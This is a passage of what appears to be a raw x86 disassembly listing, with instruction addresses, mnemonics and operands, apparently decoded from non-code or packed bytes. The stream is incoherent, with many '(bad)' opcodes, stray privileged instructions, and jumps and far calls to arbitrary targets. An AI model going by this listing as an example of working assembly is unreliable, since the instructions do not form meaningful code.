  4113ba:	jge    0x411372
  4113bc:	mov    eax,ds:0x842adf31
  4113c1:	ret    
  4113c2:	xchg   edx,eax
  4113c3:	pop    eax
  4113c4:	add    DWORD PTR [eax],esp
  4113c6:	sbb    ch,BYTE PTR [ebp+0x300815a5]
  4113cc:	popa   
  4113cd:	retf   0x6763
  4113d0:	or     ebx,DWORD PTR ss:[edx]
  4113d3:	sbb    ah,BYTE PTR [esi-0xf4f549b]
  4113d9:	sar    BYTE PTR [esi+0x4d],cl
  4113dc:	ins    DWORD PTR es:[edi],dx
  4113dd:	jl     0x41143b
  4113df:	daa    
  4113e0:	jno    0x41136f
  4113e2:	pop    ss
  4113e3:	add    al,0xeb
  4113e5:	inc    ebx
  4113e6:	cmp    BYTE PTR [eax+0x8],0xf2
  4113ea:	addr16 and edx,esi
  4113ed:	repz mov esp,DWORD PTR [edx*8-0x44ab2a9d]
  4113f5:	or     DWORD PTR [ebp-0x3dab184a],ecx
  4113fb:	cmp    ch,BYTE PTR [ecx]
  4113fd:	push   cs
  4113fe:	mov    edx,eax
  411400:	nop
  411401:	dec    esp
  411402:	ret    0x8bc8
  411405:	fistp  QWORD PTR [esi]
  411407:	xor    al,0x55
  411409:	ins    DWORD PTR es:[edi],dx
  41140a:	cs test eax,0x7213e9e7
  411410:	sbb    DWORD PTR [edx],0x6b
  411413:	mov    ebx,0x79e9b9a4
  411418:	leave  
  411419:	imul   esi,DWORD PTR ds:0xcf634f93,0x6
  411420:	dec    esi
  411421:	stos   BYTE PTR es:[edi],al
  411422:	jecxz  0x41148e
  411424:	into   
  411425:	jno    0x4113ee
  411427:	mov    BYTE PTR [esi-0x2d7b6a7b],bl
  41142d:	fadd   QWORD PTR [edi-0x76e88f1b]
  411433:	mov    al,ds:0x5a202223
  411438:	and    al,0x2e
  41143a:	cmp    ah,BYTE PTR [ebx+0x7e]
  41143d:	test   BYTE PTR ds:0xfb7786ee,0xd1
  411444:	loopne 0x411440
  411446:	aam    0xb8
  411448:	jns    0x411438
  41144a:	add    cl,BYTE PTR [edi-0x25]
  41144d:	mov    esp,DWORD PTR [edx-0x32]
  411450:	mov    dl,0x56
  411452:	fimul  WORD PTR [eax+0x2bb6beb4]
  411458:	std    
  411459:	push   ds
  41145a:	dec    edx
  41145b:	lds    eax,FWORD PTR [eax+0x39394f07]
  411461:	lock push esp
  411463:	cmp    eax,DWORD PTR [edi-0x227f7f39]
  411469:	xchg   BYTE PTR [edx],dl
  41146b:	test   eax,0x6ed9bf6a
  411470:	call   0x4a2af670
  411475:	adc    al,0x6d
  411477:	stc    
  411478:	je     0x41143a
  41147a:	pop    ebx
  41147b:	mov    ds:0xfa69d6dd,al
  411480:	xor    eax,0xe7433ee3
  411485:	cli    
  411486:	fmul   DWORD PTR [ebp+0x12cefa94]
  41148c:	sub    ch,BYTE PTR [edx]
  41148e:	pop    ecx
  41148f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411490:	add    DWORD PTR [eax+0x4c],ebx
  411493:	xchg   edi,eax
  411494:	dec    edx
  411495:	(bad)  
  411496:	jae    0x411425
  411498:	adc    BYTE PTR [edx-0x1],0x43
  41149c:	aad    0x98
  41149e:	adc    dh,bl
  4114a0:	push   edx
  4114a1:	and    al,0xca
  4114a3:	(bad)  
  4114a4:	jnp    0x411444
  4114a6:	or     al,0x4d
  4114a8:	pop    es
  4114a9:	out    dx,eax
  4114aa:	(bad)  [edx]
  4114ac:	inc    esp
  4114ad:	jl     0x411523
  4114af:	mov    cl,0x8
  4114b1:	jl     0x411496
  4114b3:	push   esp
  4114b4:	xor    BYTE PTR [edi],bh
  4114b6:	inc    ebx
  4114b7:	das    
  4114b8:	xchg   esi,eax
  4114b9:	push   ebx
  4114ba:	fucomi st,st(4)
  4114bc:	mov    ah,BYTE PTR [ecx-0x3]
  4114bf:	mov    bh,0x62
  4114c1:	dec    edx
  4114c2:	mov    bl,0x80
  4114c4:	int    0x54
  4114c6:	test   al,0x21
  4114c8:	pop    bx
  4114ca:	pop    ecx
  4114cb:	cmc    
  4114cc:	sub    BYTE PTR [esi],ch
  4114ce:	pop    ds
  4114cf:	fwait
  4114d0:	inc    ecx
  4114d1:	sub    BYTE PTR [edi+0x26],al
  4114d4:	or     BYTE PTR [ebx-0x17],ah
  4114d7:	push   ecx
  4114d8:	rcr    DWORD PTR [eax-0x78],1
  4114db:	ret    0x7745
  4114de:	adc    eax,0x1d731d84
  4114e3:	xor    DWORD PTR [edi+0x7e36c300],edi
  4114e9:	addr16 mov ds:0x610a,al
  4114ed:	mov    bh,0xf2
  4114ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114f0:	jecxz  0x41148c
  4114f2:	into   
  4114f3:	pop    ebx
  4114f4:	shl    dh,cl
  4114f6:	std    
  4114f7:	xor    esi,DWORD PTR [esi+0x40bb2629]
  4114fd:	and    bl,0xe4
  411500:	ds cwde 
  411502:	fisttp QWORD PTR [eax]
  411504:	and    esp,ecx
  411506:	loop   0x411506
  411508:	xor    eax,DWORD PTR [ebx+esi*8]
  41150b:	lahf   
  41150c:	cmp    dh,ah
  41150e:	(bad)  
  41150f:	lods   eax,DWORD PTR ds:[esi]
  411510:	mov    ebp,0x25f3f8bb
  411515:	ret    
  411516:	stos   DWORD PTR es:[edi],eax
  411517:	es push ecx
  411519:	and    cl,BYTE PTR [eax+0x58]
  41151c:	das    
  41151d:	sub    ebx,eax
  41151f:	cmp    eax,0x17344755
  411524:	xor    al,0x43
  411526:	out    dx,eax
  411527:	xchg   edi,edi
  411529:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41152a:	xchg   DWORD PTR [edx-0xf],esi
  41152d:	sbb    BYTE PTR [esi-0x2d227eff],0xf3
  411534:	push   ebx
  411535:	test   BYTE PTR [ebx],al
  411537:	test   al,0xc5
  411539:	fisub  DWORD PTR [ebx+0x3b]
  41153c:	retf   
  41153d:	xchg   ecx,eax
  41153e:	hlt    
  41153f:	mov    cs,ebx
  411541:	push   ebp
  411542:	sbb    al,BYTE PTR [ebp-0x2fac28c2]
  411548:	cld    
  411549:	mov    ebx,0x7d7fd099
  41154e:	jmp    FWORD PTR [ebx+0x2a3339c9]
  411554:	push   esp
  411555:	jg     0x41157e
  411557:	mov    dh,0x7e
  411559:	ret    0xd4fc
  41155c:	call   0x5310:0x4d547995
  411563:	imul   esi,DWORD PTR [ecx],0x3c
  411566:	inc    ecx
  411567:	add    al,0x66
  411569:	push   eax
  41156a:	pop    edx
  41156b:	jp     0x41151f
  41156d:	xor    al,0x3e
  41156f:	push   0x8b597126
  411574:	xor    al,BYTE PTR [ebp+0x47]
  411577:	repz data16 or dl,BYTE PTR [edi+eiz*1]
  41157c:	dec    esi
  41157d:	mov    ebp,0x6d9c1aec
  411582:	ss cld 
  411584:	sbb    DWORD PTR [esi],esp
  411586:	dec    ecx
  411587:	push   ecx
  411588:	and    dl,BYTE PTR es:[edi-0x1eb13dc5]
  41158f:	cmp    ch,ah
  411591:	je     0x411546
  411593:	daa    
  411594:	dec    edi
  411595:	push   ebp
  411596:	scas   al,BYTE PTR es:[edi]
  411597:	mov    cl,0x64
  411599:	cs mov bl,0x35
  41159c:	fs push edx
  41159e:	mov    bl,0x92
  4115a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115a1:	ins    DWORD PTR es:[edi],dx
  4115a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115a3:	cmp    ch,0x95
  4115a6:	pop    ecx
  4115a7:	dec    ebp
  4115a8:	add    al,0x91
  4115aa:	or     DWORD PTR [ebx],esp
  4115ac:	cs mov al,0x4d
  4115af:	fs (bad) 
  4115b1:	fisttp QWORD PTR [edx]
  4115b3:	sti    
  4115b4:	sub    bl,BYTE PTR [edx+0xa]
  4115b7:	jae    0x411632
  4115b9:	and    al,0xdf
  4115bb:	mov    bl,0x89
  4115bd:	mov    ?,WORD PTR [eax-0x4b4f693a]
  4115c3:	jge    0x41157f
  4115c5:	mov    bh,0xa7
  4115c7:	into   
  4115c8:	sti    
  4115c9:	xor    edx,edi
  4115cb:	sbb    DWORD PTR [esi-0x44],ecx
  4115ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115cf:	out    dx,eax
  4115d0:	int3   
  4115d1:	adc    esi,DWORD PTR [ebx-0x14ba371b]
  4115d7:	out    0xcc,eax
  4115d9:	or     BYTE PTR [ebp-0x17],0x88
  4115dd:	loopne 0x411566
  4115df:	and    WORD PTR [edi],dx
  4115e2:	lds    ebp,FWORD PTR [edx]
  4115e4:	sub    bh,BYTE PTR [esi]
  4115e6:	jp     0x41163d
  4115e8:	(bad)  
  4115ea:	aas    
  4115eb:	pushf  
  4115ec:	pop    ds
  4115ed:	inc    ecx
  4115ee:	push   ecx
  4115ef:	and    ebp,edx
  4115f1:	and    esp,edi
  4115f3:	cld    
  4115f4:	xchg   edi,eax
  4115f5:	xor    BYTE PTR [ecx+ecx*4],bl
  4115f8:	std    
  4115f9:	das    
  4115fa:	retf   
  4115fb:	stc    
  4115fc:	pop    edx
  4115fd:	imul   ebp,DWORD PTR [esi+0x1338c49b],0x6
  411604:	mov    ebx,0xd6f98513
  411609:	outs   dx,BYTE PTR ds:[esi]
  41160b:	dec    eax
  41160c:	ror    DWORD PTR [eax-0x5a],cl
  41160f:	repnz push 0xffffffb5
  411612:	mov    ebx,0x7cb23735
  411617:	imul   ebp,ecx,0xffffff9c
  41161a:	push   edi
  41161b:	out    dx,al
  41161c:	cs mov esi,0x58174d0c
  411622:	xor    BYTE PTR [ebp-0x44],0x47
  411626:	jmp    0x43a4:0x2fc569fa
  41162d:	mov    al,0xa0
  41162f:	pushf  
  411630:	xchg   ecx,eax
  411631:	xchg   BYTE PTR [ebx-0x766a8e8e],dl
  411637:	push   ds
  411638:	pop    esi
  411639:	lahf   
  41163a:	aas    
  41163b:	push   esi
  41163c:	cld    
  41163d:	sub    ch,BYTE PTR [ecx-0x60969b7e]
  411643:	mov    al,ds:0xaa23952a
  411648:	iret   
  411649:	sbb    eax,DWORD PTR [ecx]
  41164b:	sub    ch,BYTE PTR [ebx+0x49]
  41164e:	push   ecx
  41164f:	fadd   DWORD PTR [ebp+edi*8+0x29]
  411653:	repnz cld 
  411655:	call   0x77eef800
  41165a:	test   al,0x14
  41165c:	lods   al,BYTE PTR ds:[esi]
  41165d:	ins    BYTE PTR es:[edi],dx
  41165e:	inc    ecx
  41165f:	test   al,bh
  411661:	call   0xd1e38590
  411666:	inc    ebp
  411667:	sbb    BYTE PTR [ebp-0x1cec61cc],0xfa
  41166e:	mov    eax,0x62ecd246
  411673:	fdivr  DWORD PTR ds:0x8f8710f0
  411679:	fsubr  DWORD PTR [eax]
  41167b:	daa    
  41167c:	mov    ds:0xeb728dcb,al
  411681:	push   0x9921b95b
  411686:	sbb    DWORD PTR [esi-0x780f998f],esi
  41168c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41168d:	dec    ecx
  41168e:	(bad)  
  41168f:	sub    BYTE PTR [edi-0x23],dl
  411692:	sbb    al,bh
  411694:	retf   0x6f67
  411697:	(bad)  
  411698:	dec    esp
  411699:	inc    edi
  41169a:	cli    
  41169b:	in     eax,0x59
  41169d:	jbe    0x4116e3
  41169f:	inc    esp
  4116a0:	jae    0x4116e0
  4116a2:	rcl    BYTE PTR [edi+0x7b9772c7],1
  4116a8:	out    dx,al
  4116a9:	push   0x12ae1cd3
  4116ae:	jne    0x411644
  4116b0:	dec    esi
  4116b1:	sbb    DWORD PTR [eax+0x4443e95b],edx
  4116b7:	mov    ds,WORD PTR [edx]
  4116b9:	out    0x2b,eax
  4116bb:	call   0x4435:0xca775bc2
  4116c2:	cmp    DWORD PTR [esi-0x67],esp
  4116c5:	mov    edi,0xf3813fe4
  4116ca:	(bad)  
  4116cb:	pop    esi
  4116cc:	add    eax,0x41524679
  4116d1:	xor    ebx,DWORD PTR [edx+0x73]
  4116d4:	jne    0x411738
  4116d6:	dec    eax
  4116d7:	mov    al,ds:0xc858fcf4
  4116dc:	inc    ebx
  4116dd:	inc    esi
  4116de:	xabort 0x5d
  4116e1:	(bad)
  4116e4:	gs call 0xa22707f8
  4116ea:	stc    
  4116eb:	or     BYTE PTR [ebx],0xf2
  4116ee:	nop
  4116ef:	outs   dx,BYTE PTR ds:[esi]
  4116f0:	dec    ebx
  4116f1:	rcl    DWORD PTR [esi],cl
  4116f3:	addr16 adc dl,dl
  4116f6:	cmp    eax,0xb3c52f44
  4116fb:	mov    ebp,0xc822898e
  411700:	pop    ss
  411701:	and    edx,ecx
  411703:	push   esp
  411704:	sahf   
  411705:	scas   eax,DWORD PTR es:[edi]
  411706:	add    bl,dl
  411708:	in     eax,0x10
  41170a:	ins    BYTE PTR es:[edi],dx
  41170b:	jae    0x411701
  41170d:	leave  
  41170e:	xchg   ebx,eax
  41170f:	push   es
  411710:	or     DWORD PTR [edi],0x5f83544a
  411716:	in     al,dx
  411717:	bnd ja 0x411705
  41171a:	dec    eax
  41171b:	fnstsw WORD PTR [esi+0x3d53411]
  411721:	aaa    
  411722:	xor    al,0x78
  411724:	and    bh,0xda
  411727:	lea    ecx,[esi]
  411729:	inc    ebp
  41172a:	das    
  41172b:	adc    bh,0x75
  41172e:	xchg   esp,eax
  41172f:	outs   dx,BYTE PTR ds:[esi]
  411730:	push   0xde2fc6a5
  411735:	jge    0x411788
  411737:	xor    ebx,DWORD PTR [eax-0x3b]
  41173a:	scas   eax,DWORD PTR es:[edi]
  41173b:	push   esp
  41173c:	call   0x657a:0x75c9db37
  411743:	jo     0x411799
  411745:	lea    esi,[eax+0x4eec2833]
  41174b:	shr    BYTE PTR [edx+eax*1-0xc],cl
  41174f:	or     ebx,eax
  411751:	cmp    eax,0x6cd997e7
  411756:	sub    BYTE PTR [edi],ah
  411758:	xchg   ecx,eax
  411759:	cmp    bl,BYTE PTR [edx+ecx*4+0x2da006ce]
  411760:	mov    dh,BYTE PTR [edx+0x0]
  411763:	icebp  
  411764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411765:	ins    BYTE PTR es:[edi],dx
  411766:	shl    BYTE PTR [eax+esi*8+0x76],1
  41176a:	(bad)  
  41176b:	rol    edx,cl
  41176d:	test   eax,0xa847c5a3
  411772:	adc    BYTE PTR ds:0x7146fde6,ah
  411778:	xchg   ebx,eax
  411779:	mov    bl,0x7
  41177b:	push   esi
  41177c:	repz or ch,BYTE PTR [edx-0xb180292]
  411783:	xchg   BYTE PTR [ebp-0x433a2e70],bl
  411789:	jg     0x411722
  41178b:	push   0x8
  41178d:	hlt    
  41178e:	jp     0x411772
  411790:	mov    DWORD PTR [eax-0x54],eax
  411793:	aas    
  411794:	push   esi
  411795:	add    dh,al
  411797:	out    dx,eax
  411798:	or     eax,0x8b21cbe5
  41179d:	loopne 0x4117f0
  41179f:	mov    cs,WORD PTR [edx-0x43ad3b6d]
  4117a5:	fmul   DWORD PTR [edx+eax*8+0x1d]
  4117a9:	jecxz  0x41176c
  4117ab:	leave  
  4117ac:	fs inc esi
  4117ae:	push   0xcdd8459a
  4117b3:	jecxz  0x411775
  4117b5:	fist   WORD PTR [esi]
  4117b7:	mov    bl,0xd8
  4117b9:	into   
  4117ba:	push   esp
  4117bb:	xor    al,0x44
  4117bd:	or     cl,BYTE PTR [edi]
  4117bf:	mov    dl,0x62
  4117c1:	icebp  
  4117c2:	dec    esi
  4117c3:	and    al,0xe1
  4117c5:	(bad)  
  4117c6:	pop    edx
  4117c7:	jecxz  0x41182d
  4117c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117ca:	sti    
  4117cb:	pop    ebx
  4117cc:	test   ah,dl
  4117ce:	cs pop ebx
  4117d0:	xor    al,ah
  4117d2:	aam    0x12
  4117d4:	or     eax,0x7abbe95e
  4117d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117da:	or     ebp,esp
  4117dc:	push   edi
  4117dd:	cmp    DWORD PTR [esi],0x2ca24ed4
  4117e3:	rol    BYTE PTR [esi-0x11a8dc88],0x74
  4117ea:	pushf  
  4117eb:	and    al,0xfa
  4117ed:	call   0x759e00c1
  4117f2:	jo     0x4117a8
  4117f4:	jmp    0x41183e
  4117f6:	in     al,0x94
  4117f8:	aas    
  4117f9:	fild   QWORD PTR [eax]
  4117fb:	cmp    cl,BYTE PTR [esp+ebx*2]
  4117fe:	dec    edi
  4117ff:	pop    esi
  411800:	clc    
  411801:	mov    eax,ds:0x3a4748f2
  411806:	cwde   
  411807:	(bad)
  41180a:	inc    edi
  41180b:	pusha  
  41180c:	mov    edx,0x5e1ebd98
  411811:	mov    ch,0x2d
  411813:	or     dl,BYTE PTR [eax]
  411815:	std    
  411816:	lds    esi,FWORD PTR [edi+edx*2-0x4009a3e4]
  41181d:	adc    edi,ebx
  41181f:	dec    ecx
  411820:	inc    edx
  411821:	add    DWORD PTR ds:0x2ff09e62,ecx
  411827:	jecxz  0x4117f9
  411829:	out    dx,eax
  41182a:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41182c:	call   0xd7e43e7b
  411831:	sbb    cl,dl
  411833:	sub    edi,esi
  411835:	cmp    ch,BYTE PTR [eax+0x13]
  411838:	cdq    
  411839:	(bad)  
  41183a:	push   esp
  41183b:	cmp    BYTE PTR [eax+ebx*2+0x75],0x86
  411840:	jge    0x411891
  411842:	mov    bl,0x1f
  411844:	sub    eax,0x5f686d78
  411849:	cmp    DWORD PTR [ecx-0x62428acd],edi
  41184f:	inc    edx
  411850:	push   eax
  411851:	(bad)  [ecx]
  411853:	adc    DWORD PTR [eax],edx
  411855:	jb     0x41189d
  411857:	scas   al,BYTE PTR es:[edi]
  411858:	fdivr  DWORD PTR [edx-0x6781ab56]
  41185e:	test   al,0x17
  411860:	cmp    BYTE PTR [ebx+eax*1-0xb],0x90
  411865:	add    BYTE PTR [esi-0x2c],0x7d
  411869:	retf   
  41186a:	bound  esi,QWORD PTR [ebp-0x33]
  41186d:	es push cs
  41186f:	xor    DWORD PTR [edi-0x3fbc3579],edi
  411875:	adc    eax,DWORD PTR [eax]
  411877:	dec    esi
  411878:	push   ecx
  411879:	cld    
  41187a:	ins    DWORD PTR es:[edi],dx
  41187b:	pop    edx
  41187c:	sti    
  41187d:	and    esp,DWORD PTR [edi+ecx*2+0x7b]
  411881:	lods   eax,DWORD PTR ds:[esi]
  411882:	xor    ah,BYTE PTR [ebx]
  411884:	mov    DWORD PTR [eax+eax*8-0x5c5ca0c0],0x4ab4379d
  41188f:	stos   WORD PTR es:[edi],ax
  411891:	push   DWORD PTR [ebx-0x27]
  411894:	fisttp QWORD PTR [esi+edi*1-0x4f]
  411898:	mov    dh,0xd4
  41189a:	icebp  
  41189b:	addr16 jp 0x41188b
  41189e:	rol    DWORD PTR [edi],0x7
  4118a1:	js     0x4118ab
  4118a3:	lea    ebp,[esi]
  4118a5:	call   0x77db:0x8b2ff43e
  4118ac:	inc    eax
  4118ad:	push   edx
  4118ae:	mov    eax,DWORD PTR gs:[ecx]
  4118b1:	ja     0x41189d
  4118b3:	cmp    ebp,DWORD PTR [ebx]
  4118b5:	xchg   edi,eax
  4118b6:	js     0x411884
  4118b8:	push   cs
  4118b9:	inc    esi
  4118ba:	push   ss
  4118bb:	sbb    dl,BYTE PTR [edi+0x74]
  4118be:	(bad)  
  4118bf:	xchg   ecx,eax
  4118c0:	clc    
  4118c1:	aam    0xa
  4118c3:	aaa    
  4118c4:	adc    al,0x5e
  4118c6:	or     bl,BYTE PTR [ebx-0x51]
  4118c9:	ror    BYTE PTR [edx-0x7eadb512],cl
  4118cf:	cwde   
  4118d0:	inc    edi
  4118d1:	cmp    BYTE PTR [eax-0x4be9cded],al
  4118d7:	jge    0x4118dd
  4118d9:	mov    gs,WORD PTR [edi]
  4118db:	int3   
  4118dc:	dec    eax
  4118dd:	xchg   edx,eax
  4118de:	sub    al,0x7f
  4118e0:	rcl    DWORD PTR [eax+ebp*1+0x3],0xda
  4118e5:	fidivr WORD PTR [ebx-0x60]
  4118e8:	cmp    edi,0x13
  4118eb:	dec    esi
  4118ec:	jbe    0x411921
  4118ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118ef:	loop   0x4118b6
  4118f1:	(bad)  
  4118f2:	xchg   ecx,eax
  4118f3:	popa   
  4118f4:	jecxz  0x4118de
  4118f6:	iret   
  4118f7:	lods   eax,DWORD PTR ds:[esi]
  4118f8:	cmp    eax,0x157403c2
  4118fd:	jle    0x41193a
  4118ff:	inc    eax
  411900:	test   DWORD PTR [ebx-0x3a],edi
  411903:	mov    bl,BYTE PTR [edx+0x3d]
  411906:	inc    ebp
  411907:	test   al,ah
  411909:	cmp    ebx,esp
  41190b:	pop    edx
  41190c:	les    edx,FWORD PTR [ebx-0x5b]
  41190f:	js     0x41195f
  411911:	xchg   ebx,eax
  411912:	cmc    
  411913:	fdivr  QWORD PTR [ecx+0x2bb934db]
  411919:	push   esi
  41191a:	jae    0x4118eb
  41191c:	sbb    bl,cl
  41191e:	mov    eax,0x906adf2f
  411923:	adc    BYTE PTR ds:0xcff8a595,ch
  411929:	and    BYTE PTR [edi],bh
  41192b:	push   es
  41192c:	cmp    eax,0xf32ac38f
  411931:	push   esi
  411932:	mov    dl,0x2f
  411934:	jecxz  0x4118ed
  411936:	fdiv   DWORD PTR [edx]
  411938:	and    al,0xd1
  41193a:	push   edi
  41193b:	jo     0x411927
  41193d:	and    eax,0x61205db8
  411942:	and    bl,dl
  411944:	sar    DWORD PTR [ecx-0x3fcb57d7],1
  41194a:	xor    BYTE PTR [eax],ah
  41194c:	sub    DWORD PTR ds:0xae07c40c,0xffffffe5
  411953:	(bad)  
  411954:	push   ebp
  411955:	mov    eax,ds:0x556ee001
  41195a:	scas   eax,DWORD PTR es:[edi]
  41195b:	test   eax,0xee4361b5
  411960:	fnsave [esi+0xb]
  411963:	mov    dh,0xf6
  411965:	loope  0x411961
  411967:	fsubr  DWORD PTR [esi]
  411969:	sbb    BYTE PTR [ebx+edx*2],bl
  41196c:	loope  0x411906
  41196e:	and    BYTE PTR ds:0xb222b655,dl
  411974:	paddsb mm4,QWORD PTR [ebp-0x43]
  411978:	pop    esp
  411979:	dec    ecx
  41197a:	inc    ebp
  41197b:	or     ah,BYTE PTR [ebx-0x48516e2b]
  411981:	retf   0x51b4
  411984:	xchg   ebp,eax
  411985:	inc    edx
  411987:	cmp    DWORD PTR [ebx-0x4821b509],ebx
  41198d:	fistp  WORD PTR [ebp+0xa]
  411990:	sub    esi,DWORD PTR [ecx+0x67c61d61]
  411996:	adc    eax,0x9d189e21
  41199b:	mov    al,ds:0xfa240445
  4119a0:	mov    al,ds:0x806e7a55
  4119a5:	mov    eax,ds:0x852e9aba
  4119aa:	ins    BYTE PTR es:[edi],dx
  4119ab:	idiv   BYTE PTR [edi+0x79de9d8a]
  4119b1:	cmp    bh,ah
  4119b3:	call   0x6759:0x9461e8ed
  4119ba:	cmc    
  4119bb:	cmp    DWORD PTR [esi],0x5b
  4119be:	imul   ebx,DWORD PTR [edx],0x4a
  4119c1:	or     bl,BYTE PTR [esi+0x67]
  4119c4:	sbb    esi,DWORD PTR [ebp+0x42]
  4119c7:	js     0x411967
  4119c9:	mov    ds:0xafc94dd,eax
  4119ce:	sbb    al,0xec
  4119d0:	pop    esi
  4119d1:	test   BYTE PTR [esi],bh
  4119d3:	cmp    DWORD PTR [ebp+esi*2+0x2a],ecx
  4119d7:	jne    0x4119a6
  4119d9:	pusha  
  4119da:	aad    0x73
  4119dc:	sar    esp,cl
  4119de:	mov    DWORD PTR [eax+0x24b9f991],esp
  4119e4:	bound  esi,QWORD PTR [edi+0x55]
  4119e7:	mov    ds,WORD PTR [ebp-0x18d5b00f]
  4119ed:	ficom  WORD PTR [esi]
  4119ef:	mov    ebx,0xaf25b6f7
  4119f4:	mov    edi,0x82e8b86
  4119f9:	stc    
  4119fa:	lds    ecx,FWORD PTR [ecx]
  4119fc:	xor    ebx,edx
  4119fe:	cmp    edx,DWORD PTR [edi+eax*1]
  411a01:	push   esi
  411a02:	sti    
  411a03:	dec    ebx
  411a04:	mov    bl,0xe9
  411a06:	in     al,dx
  411a07:	stos   BYTE PTR es:[edi],al
  411a08:	xor    DWORD PTR [eax],ebp
  411a0a:	or     ch,BYTE PTR [esi]
  411a0c:	xor    eax,0x5f7279cc
  411a11:	adc    eax,0xbc9037a0
  411a16:	jnp    0x411a68
  411a18:	or     DWORD PTR [edx-0x5e],esp
  411a1b:	lods   eax,DWORD PTR ds:[esi]
  411a1c:	in     eax,dx
  411a1d:	enter  0x1164,0x17
  411a21:	lods   al,BYTE PTR ds:[esi]
  411a22:	sub    al,0x29
  411a24:	scas   eax,DWORD PTR es:[edi]
  411a25:	jne    0x411a94
  411a27:	and    ecx,DWORD PTR [eax]
  411a29:	adc    eax,0x398a8141
  411a2e:	mov    edx,0x65675d8d
  411a33:	xchg   esp,eax
  411a34:	bnd jmp 0x411a2f
  411a37:	fistp  QWORD PTR [esi-0x6a]
  411a3a:	mov    esp,0xd5695736
  411a3f:	sbb    BYTE PTR [edx-0x48f315b6],dl
  411a45:	cmp    al,BYTE PTR [ebx-0x6d42a45f]
  411a4b:	mov    ebx,0xeed565e0
  411a50:	enter  0xf266,0x8b
  411a54:	out    dx,eax
  411a55:	popa   
  411a56:	inc    eax
  411a57:	leave  
  411a58:	retf   0xc279
  411a5b:	popf   
  411a5c:	jp     0x411a7d
  411a5e:	xchg   ebx,eax
  411a5f:	mov    dl,0x3b
  411a61:	loop   0x411a14
  411a63:	iret   
  411a64:	scas   al,BYTE PTR es:[edi]
  411a65:	mov    dl,0xcb
  411a67:	push   0x69181bbf
  411a6c:	fcmovb st,st(3)
  411a6e:	xor    BYTE PTR [ebx+0x8],cl
  411a71:	cmc    
  411a72:	and    dh,BYTE PTR [ebx+0x33275f2e]
  411a78:	test   al,0xc6
  411a7a:	retf   
  411a7b:	je     0x411adb
  411a7d:	or     al,BYTE PTR [ecx]
  411a7f:	dec    esi
  411a80:	sbb    eax,0x3318251f
  411a85:	pop    esi
  411a86:	(bad)  
  411a87:	lock cld 
  411a89:	mov    edx,0xf6446fcf
  411a8e:	pop    ss
  411a8f:	inc    esp
  411a90:	xlat   BYTE PTR ds:[ebx]
  411a91:	js     0x411a48
  411a93:	mov    ebx,0x3e9ca49
  411a98:	imul   esi,DWORD PTR [ecx],0x3c
  411a9b:	xchg   bl,ch
  411a9d:	ret    0x62f8
  411aa0:	mov    esi,0x443193a8
  411aa5:	jbe    0x411a27
  411aa7:	iret   
  411aa8:	pop    eax
  411aa9:	push   ebp
  411aaa:	jo     0x411b04
  411aac:	xchg   ecx,eax
  411aad:	cld    
  411aae:	dec    esp
  411aaf:	xor    BYTE PTR [ebx+0x59326874],bl
  411ab5:	in     eax,0x60
  411ab7:	and    al,0xb9
  411ab9:	xchg   edx,eax
  411aba:	cmp    al,0xc0
  411abc:	clc    
  411abd:	xchg   ebx,eax
  411abe:	aad    0x8c
  411ac0:	rcr    DWORD PTR [edx-0x1f676fda],1
  411ac6:	adc    DWORD PTR gs:[eax],edx
  411ac9:	out    dx,al
  411aca:	pop    ss
  411acb:	inc    edx
  411acc:	or     BYTE PTR [esi-0x45],bl
  411acf:	pop    esp
  411ad0:	mov    ch,0x1
  411ad2:	mov    DWORD PTR [eax+0x6f],esi
  411ad5:	mov    dh,0x0
  411ad7:	loop   0x411a7b
  411ad9:	and    cl,cl
  411adb:	mov    ebp,0xb287874f
  411ae0:	cmp    ch,bl
  411ae2:	pop    ebx
  411ae3:	iret   
  411ae4:	fsubr  DWORD PTR [esp+edi*4-0xb5a29f6]
  411aeb:	cmp    eax,0xbcc4183d
  411af0:	aad    0x17
  411af2:	clc    
  411af3:	call   0x240ea642
  411af8:	add    edx,DWORD PTR [ebx]
  411afa:	jne    0x411abf
  411afc:	xchg   esp,eax
  411afd:	xor    ebx,DWORD PTR [edi+ebx*2-0x24]
  411b01:	push   es
  411b02:	inc    esi
  411b03:	xchg   ecx,eax
  411b04:	scas   al,BYTE PTR es:[edi]
  411b05:	push   cs
  411b06:	call   0x410dac6a
  411b0b:	dec    esi
  411b0c:	dec    edx
  411b0d:	add    ebx,DWORD PTR [edx+0x46]
  411b10:	aas    
  411b11:	dec    esp
  411b13:	iret   
  411b14:	cwde   
  411b15:	in     eax,dx
  411b16:	sub    DWORD PTR [edx+0x36],0xffffffb1
  411b1a:	mov    ds:0xb3df024,al
  411b1f:	js     0x411b2d
  411b21:	pop    ebp
  411b22:	test   eax,0x470faceb
  411b27:	push   ss
  411b28:	in     al,0x35
  411b2a:	push   es
  411b2b:	and    al,BYTE PTR [ebx-0x5]
  411b2e:	jno    0x411b33
  411b30:	aaa    
  411b31:	out    dx,al
  411b32:	mov    ds:0xd1829193,eax
  411b37:	xchg   ebx,eax
  411b38:	mov    edx,0x8337d908
  411b3d:	sub    ch,BYTE PTR [eax]
  411b3f:	and    DWORD PTR [esi-0x7b372f19],eax
  411b45:	icebp  
  411b46:	adc    DWORD PTR [ecx],0x2a
  411b49:	xchg   edi,eax
  411b4a:	inc    ebx
  411b4b:	inc    eax
  411b4c:	jp     0x411ad4
  411b4e:	scas   eax,DWORD PTR es:[edi]
  411b4f:	push   ebx
  411b50:	ins    BYTE PTR es:[edi],dx
  411b51:	stc    
  411b52:	mov    edi,0xa68b5d2e
  411b57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b58:	sbb    BYTE PTR [ecx-0x63e8554],cl
  411b5e:	ds xchg edi,eax
  411b60:	push   ebp
  411b61:	adc    bl,bh
  411b63:	mov    bl,0x74
  411b65:	addr16 or dh,bh
